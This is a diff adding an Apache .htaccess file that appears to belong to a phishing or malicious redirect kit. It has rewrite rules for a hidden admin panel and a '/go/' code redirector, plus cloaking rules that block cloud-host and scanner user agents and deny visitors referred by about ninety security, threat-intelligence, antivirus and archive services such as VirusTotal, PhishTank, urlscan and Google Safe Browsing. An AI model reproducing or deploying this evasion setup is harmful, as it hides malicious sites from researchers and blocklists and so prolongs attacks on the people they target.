@@ -1,0 +1,129 @@
+Options +FollowSymLinks
+RewriteEngine On
+RewriteRule ^nealmtroy/dashboard$ pane/dash.php [NC,L]
+RewriteRule ^nealmtroy/blacklist$ pane/blacklist.php [NC,L]
+RewriteRule ^nealmtroy/settings$ pane/settings.php [NC,L]
+RewriteRule ^nealmtroy/manage$ pane/manage.php [NC,L]
+RewriteRule ^nealmtroy/statistic$ pane/statistic.php [NC,L]
+RewriteRule ^nealmtroy$ pane/login.php [NC,L]
+RewriteRule ^go/(.+)$ neal.php?code=$1 [NC,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_URI} !^/$
+RewriteRule ^(.*)$ neal.php?code=invalid [NC,L]
+
+RewriteBase /  
+SetEnvIfNoCase User-Agent "^DigitalOcean, LLC" bad_user
+SetEnvIfNoCase User-Agent "^Amazon Technologies Inc." bad_user
+SetEnvIfNoCase User-Agent "^Amazon.com, Inc." bad_user
+SetEnvIfNoCase User-Agent "^Google LLC" bad_user
+SetEnvIfNoCase User-Agent "^FranTech Solutions" bad_user
+SetEnvIfNoCase User-Agent "^Tier.Net Technologies LLC" bad_user
+SetEnvIfNoCase User-Agent "^OVH SAS" bad_user
+SetEnvIfNoCase User-Agent "^MJ12bot" bad_user
+SetEnvIfNoCase User-Agent "^AhrefsBot" bad_user
+SetEnvIfNoCase User-Agent "^SemrushBot" bad_user
+SetEnvIfNoCase User-Agent "^masscan" bad_user
+Deny from env=bad_user
+
+# Blokir Referrer
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} amazon\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} digitalocean\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} facebook\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} yahoo\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} bing\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} msn\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} aol\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} hotbot\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} phishtank\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} infoseek\.co\.jp [NC,OR]
+RewriteCond %{HTTP_REFERER} inspici\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} censys\.io [NC,OR]
+RewriteCond %{HTTP_REFERER} paloaltonetworks\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} virustotal\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} hybrid-analysis\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} urlscan\.io [NC,OR]
+RewriteCond %{HTTP_REFERER} any\.run [NC,OR]
+RewriteCond %{HTTP_REFERER} threatcrowd\.org [NC,OR]
+RewriteCond %{HTTP_REFERER} urlquery\.net [NC,OR]
+RewriteCond %{HTTP_REFERER} talosintelligence\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} fortiguard\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} threatminer\.org [NC,OR]
+RewriteCond %{HTTP_REFERER} abuse\.ch [NC,OR]
+RewriteCond %{HTTP_REFERER} isc\.sans\.edu [NC,OR]
+RewriteCond %{HTTP_REFERER} shadowserver\.org [NC,OR]
+RewriteCond %{HTTP_REFERER} alienvault\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} openphish\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} malware\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} blacklistalert\.org [NC,OR]
+RewriteCond %{HTTP_REFERER} intelligencex\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} netcraft\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} meta\.defense\.fr [NC,OR]
+RewriteCond %{HTTP_REFERER} threatintelligenceplatform\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} securitytrails\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} xforce\.security\.ibm\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} urlhaus\.abuse\.ch [NC,OR]
+RewriteCond %{HTTP_REFERER} malshare\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} cybercrime-tracker\.net [NC,OR]
+RewriteCond %{HTTP_REFERER} malpedia\.caad\.fkie\.fraunhofer\.de [NC,OR]
+RewriteCond %{HTTP_REFERER} risk\.disqus\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} badips\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} fraudguard\.io [NC,OR]
+RewriteCond %{HTTP_REFERER} malwares\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} threatfox\.abuse\.ch [NC,OR]
+RewriteCond %{HTTP_REFERER} vxvault\.net [NC,OR]
+RewriteCond %{HTTP_REFERER} malc0de\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} cyberthreatcoalition\.org [NC,OR]
+RewriteCond %{HTTP_REFERER} checkphish\.ai [NC,OR]
+RewriteCond %{HTTP_REFERER} opendns\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} talos\.cisco\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} securityscorecard\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} viriback\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} kaspersky\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} fireeye\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} proofpoint\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} zscaler\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} securonix\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} trendmicro\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} cyberpolygon\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} darkreading\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} redhuntlabs\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} ti.defense\.fr [NC,OR]
+RewriteCond %{HTTP_REFERER} pastebin\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} heuristicleads\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} blocklist\.de [NC,OR]
+RewriteCond %{HTTP_REFERER} ti\.crowdstrike\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} bfore\.ai [NC,OR]
+RewriteCond %{HTTP_REFERER} threatconnect\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} abuse\.reports [NC,OR]
+RewriteCond %{HTTP_REFERER} safe\.browsing\.google [NC,OR]
+RewriteCond %{HTTP_REFERER} urlcheck\.mcafee\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} viruscheck\.trendmicro\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} ibm\.xforce\.security [NC,OR]
+RewriteCond %{HTTP_REFERER} opsec\.watchguard\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} fsecure\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} bitdefender\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} rapid7\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} qualys\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} rsa\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} cobalt\.io [NC,OR]
+RewriteCond %{HTTP_REFERER} pentera\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} greynoise\.io [NC,OR]
+RewriteCond %{HTTP_REFERER} threatpost\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} internet-measurement\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} spidersoft\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} archive\.org [NC,OR]
+RewriteCond %{HTTP_REFERER} ^https?://(www\.)?safebrowsing-cache\.google\.com/.*$ [NC]
+RewriteRule .* - [F,L]
+
+<FilesMatch "\.(ini|htaccess|inc|info|log|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl|json)(~|\.sw[op]|\.bak|\.orig|\.save)?$|^(\.(?!well-known).*|Entries.*|Repository|Root|Tag|Template|composer\.(json|lock)|package\.(json|lock)|urls_config\.json|config\.json|web\.config)$|^#.*#$|\.php(~|\.sw[op]|\.bak|\.orig\.save)$">
+    Require all denied
+</FilesMatch>
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php81” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php81 .php .php8 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
